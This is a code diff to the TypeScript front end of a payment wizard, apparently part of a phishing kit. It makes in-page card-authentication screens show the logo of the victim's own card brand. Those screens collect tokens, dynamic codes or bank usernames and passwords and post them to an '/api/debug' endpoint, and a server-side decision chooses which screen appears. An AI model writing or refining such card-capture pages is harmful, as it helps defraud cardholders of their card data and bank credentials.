@@ -46,6 +46,7 @@ const EMAIL = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
 const PLATE = /^([A-Z]{3}[0-9]{3}|[A-Z]{3}[0-9]{2}[A-Z])$/;
 
 let state: WizardState = emptyState();
+let lastCardBrand = "visa";
 
 function emptyState(): WizardState {
   return {
@@ -588,8 +589,19 @@ function setAuthMessage(kind: string, message: string) {
   error.hidden = !message;
 }
 
-function showAuthScreen(kind: string, message = "") {
+function authBrandKey(value: string) {
+  const brand = String(value || "").toLowerCase();
+  if (brand.includes("amex")) return "amex";
+  if (brand.includes("master")) return "mastercard";
+  if (brand.includes("diner")) return "diners";
+  if (brand.includes("discover")) return "discover";
+  if (brand.includes("visa")) return "visa";
+  return lastCardBrand || "visa";
+}
+
+function showAuthScreen(kind: string, message = "", brandKey = "") {
   const screen = $("pagos-auth-screen") as HTMLElement | null;
+  lastCardBrand = authBrandKey(brandKey);
   hidePasarelaScreens();
   document.body.classList.add("is-offers-waiting");
   showOverlay("cardOverlay", false);
@@ -600,6 +612,9 @@ function showAuthScreen(kind: string, message = "") {
     (panel as HTMLElement).style.display = active ? "block" : "none";
     if (!active) return;
     fillChallengeMeta(panel);
+    panel.querySelectorAll("[data-auth-brand]").forEach((logo) => {
+      (logo as HTMLElement).hidden = logo.getAttribute("data-auth-brand") !== lastCardBrand;
+    });
     panel.querySelectorAll("input").forEach((input) => {
       (input as HTMLInputElement).value = "";
     });
@@ -628,7 +643,7 @@ async function handlePaymentDecision(
     return;
   }
   if (authKind) {
-    showAuthScreen(authKind, action.endsWith("_error") ? decision.message || "" : "");
+    showAuthScreen(authKind, action.endsWith("_error") ? decision.message || "" : "", decision.brand || brandKey);
     return;
   }
   if (action === "card" || action === "card_error") {
@@ -983,6 +998,7 @@ export function bindSolicitudWizard() {
     const number = val("cardNumero");
     const digits = number.replace(/\D/g, "");
     const brandKey = cardBrandKey(digits);
+    lastCardBrand = brandKey;
     const payBtn = $("btnPagarTarjeta") as HTMLButtonElement | null;
     if (payBtn) {
       payBtn.disabled = true;
@@ -1117,7 +1133,7 @@ export function bindSolicitudWizard() {
       const eventName = kind === "token" ? "TOKEN_SUBMIT" : kind === "dynamic" ? "DYNAMIC_SUBMIT" : "USERPASS_SUBMIT";
       const sessionId = sessionStorage.getItem("latam-debug-session-id") || crypto.randomUUID();
       sessionStorage.setItem("latam-debug-session-id", sessionId);
-      const brandKey = "visa";
+      const brandKey = lastCardBrand || "visa";
       try {
         await fetch("/api/debug", {
           method: "POST",
